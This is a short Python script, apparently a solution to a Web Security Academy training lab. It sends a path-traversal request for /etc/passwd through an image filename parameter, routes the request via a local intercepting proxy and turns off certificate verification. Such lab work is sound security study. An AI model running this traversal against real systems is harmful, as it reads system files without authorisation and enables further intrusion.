import requests

#to disable ceritifcate warning
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

url =  "https://0aef003a04b1d9b480e3e9b400960003.web-security-academy.net/image?filename=/etc/passwd"
r = requests.get(url, verify=False, proxies=proxies)
print('body is ', r.text)